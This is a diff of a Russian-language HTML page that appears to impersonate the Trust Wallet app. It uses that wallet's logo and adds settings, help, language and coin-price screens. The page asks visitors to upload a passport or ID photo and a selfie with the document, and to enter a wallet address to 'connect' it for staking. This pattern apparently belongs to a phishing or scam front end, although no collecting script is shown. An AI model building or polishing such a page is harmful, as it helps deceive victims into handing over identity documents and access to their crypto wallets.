@@ -9,46 +9,154 @@
 </head>
 <body>
     <div class="app-container">
-        <div class="header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" alt="Logo" class="logo">
-        </div>
-        
-        <div class="card">
-            <h3 class="card-title">Верификация личности</h3>
-            <div class="input-group">
-                <label class="label">Документ (ID / Паспорт)</label>
-                <div class="file-upload-wrapper">
-                    <input type="file" id="docInput" accept="image/*">
-                    <div class="file-custom">Выбрать фото</div>
+        <!-- Главный экран -->
+        <div id="mainScreen" class="screen active">
+            <div class="header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" alt="Logo" class="logo">
+                <button class="settings-btn" id="settingsBtn">⚙️</button>
+            </div>
+            
+            <div class="card">
+                <h3 class="card-title" data-i18n="verify_title">Верификация личности</h3>
+                <div class="input-group">
+                    <label class="label" data-i18n="doc_label">Документ (ID / Паспорт)</label>
+                    <div class="file-upload-wrapper">
+                        <input type="file" id="docInput" accept="image/*">
+                        <div class="file-custom" data-i18n="choose_photo">Выбрать фото</div>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label class="label" data-i18n="selfie_label">Селфи с документом</label>
+                    <div class="file-upload-wrapper">
+                        <input type="file" id="selfieInput" accept="image/*">
+                        <div class="file-custom" data-i18n="take_photo">Сделать фото</div>
+                    </div>
+                </div>
+                <button id="verifyBtn" class="btn btn-primary" data-i18n="send_data">Отправить данные</button>
+            </div>
+
+            <div class="card">
+                <h3 class="card-title" data-i18n="staking_title">Стейкинг активов</h3>
+                <div class="input-group">
+                    <input type="text" id="walletInput" placeholder="0x..." class="text-input" data-i18n-placeholder="wallet_placeholder">
+                </div>
+                <button id="stakingBtn" class="btn btn-outline" data-i18n="connect_wallet">Подключить кошелек</button>
+            </div>
+
+            <div class="card tokens-card">
+                <div class="tokens-tabs">
+                    <span class="tab active">Top</span>
+                    <span class="tab">BNB</span>
+                    <span class="tab">ETH</span>
+                    <span class="tab">SOL</span>
+                </div>
+                <div id="tokensList" class="tokens-list">
+                    <div class="loading" data-i18n="loading">Загрузка котировок...</div>
                 </div>
             </div>
-            <div class="input-group">
-                <label class="label">Селфи с документом</label>
-                <div class="file-upload-wrapper">
-                    <input type="file" id="selfieInput" accept="image/*">
-                    <div class="file-custom">Сделать фото</div>
+        </div>
+
+        <!-- Экран настроек -->
+        <div id="settingsScreen" class="screen">
+            <div class="screen-header">
+                <button class="back-btn" id="backFromSettings">←</button>
+                <h2 data-i18n="settings">Настройки</h2>
+            </div>
+            <div class="card menu-card" id="helpBtn">
+                <span data-i18n="help_support">Помощь и поддержка</span>
+                <span class="arrow">›</span>
+            </div>
+            <div class="card menu-card" id="langBtn">
+                <span data-i18n="language">Язык</span>
+                <span class="arrow">›</span>
+            </div>
+            <div class="card menu-card" id="privacyBtn">
+                <span data-i18n="privacy">Политика конфиденциальности</span>
+                <span class="arrow">›</span>
+            </div>
+        </div>
+
+        <!-- Экран помощи -->
+        <div id="helpScreen" class="screen">
+            <div class="screen-header">
+                <button class="back-btn" id="backFromHelp">←</button>
+                <h2 data-i18n="help_support">Помощь и поддержка</h2>
+            </div>
+            <div class="card menu-card" id="supportCenterBtn">
+                <span data-i18n="support_center">Центр поддержки</span>
+                <span class="arrow">›</span>
+            </div>
+            <div class="card menu-card" id="supportServiceBtn">
+                <span data-i18n="support_service">Служба поддержки</span>
+                <span class="arrow">›</span>
+            </div>
+        </div>
+
+        <!-- Экран выбора языка -->
+        <div id="langScreen" class="screen">
+            <div class="screen-header">
+                <button class="back-btn" id="backFromLang">←</button>
+                <h2 data-i18n="language">Язык</h2>
+            </div>
+            <div class="card lang-card">
+                <label class="lang-option">
+                    <span>Русский - RU</span>
+                    <input type="radio" name="lang" value="ru" checked>
+                </label>
+                <label class="lang-option">
+                    <span>English - EN</span>
+                    <input type="radio" name="lang" value="en">
+                </label>
+                <label class="lang-option">
+                    <span>Français - FR</span>
+                    <input type="radio" name="lang" value="fr">
+                </label>
+                <label class="lang-option">
+                    <span>Deutsch - DE</span>
+                    <input type="radio" name="lang" value="de">
+                </label>
+            </div>
+        </div>
+
+        <!-- Экран детальной информации о монете -->
+        <div id="coinScreen" class="screen">
+            <div class="screen-header">
+                <button class="back-btn" id="backFromCoin">←</button>
+                <h2 id="coinName">Bitcoin</h2>
+            </div>
+            <div class="card coin-detail">
+                <div class="coin-price-block">
+                    <div id="coinPrice" class="coin-big-price">$68,269.55</div>
+                    <div id="coinChange" class="coin-change neg">-410,58 $ (-0,59%)</div>
                 </div>
+                <div class="chart-periods">
+                    <button class="period-btn" data-period="1">1ч</button>
+                    <button class="period-btn active" data-period="24">1Д</button>
+                    <button class="period-btn" data-period="7">1Н</button>
+                    <button class="period-btn" data-period="30">1М</button>
+                    <button class="period-btn" data-period="365">1Г</button>
+                    <button class="period-btn" data-period="max">Всё</button>
+                </div>
+                <img id="coinChart" src="" alt="График" class="coin-chart">
             </div>
-            <button id="verifyBtn" class="btn btn-primary">Отправить данные</button>
-        </div>
-
-        <div class="card">
-            <h3 class="card-title">Стейкинг активов</h3>
-            <div class="input-group">
-                <input type="text" id="walletInput" placeholder="Адрес кошелька (0x...)" class="text-input">
-            </div>
-            <button id="stakingBtn" class="btn btn-outline">Подключить кошелек</button>
-        </div>
-
-        <div class="card tokens-card">
-            <div class="tokens-tabs">
-                <span class="tab active">Top</span>
-                <span class="tab">BNB</span>
-                <span class="tab">ETH</span>
-                <span class="tab">SOL</span>
-            </div>
-            <div id="tokensList" class="tokens-list">
-                <div class="loading">Загрузка котировок...</div>
+            <div class="card">
+                <h3 class="card-title" data-i18n="statistics">Статистика</h3>
+                <div class="stat-row">
+                    <span data-i18n="market_cap">Капитализация</span>
+                    <span id="statMcap">—</span>
+                </div>
+                <div class="stat-row">
+                    <span data-i18n="circulating">Количество в обращении</span>
+                    <span id="statCirc">—</span>
+                </div>
+                <div class="stat-row">
+                    <span data-i18n="total_supply">Общее предложение</span>
+                    <span id="statSupply">—</span>
+                </div>
+                <div class="stat-row">
+                    <span data-i18n="volume_24h">Объём (24 ч)</span>
+                    <span id="statVol">—</span>
+                </div>
             </div>
         </div>
 
